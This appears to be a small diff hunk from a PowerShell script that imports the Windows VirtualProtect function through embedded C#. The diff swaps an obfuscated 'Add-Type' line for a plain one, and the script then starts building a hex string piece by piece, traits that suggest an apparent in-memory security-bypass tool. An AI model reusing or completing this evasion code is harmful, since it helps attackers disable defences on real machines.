@@ -10,7 +10,7 @@ public class APIs {
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
 }
 "@
-A+'dd'-T+'y'+'p'+'e' $Zeus
+Add-Type $Zeus
 $z1 = "0"
 $z2 = "x"
 $z3 = "B"
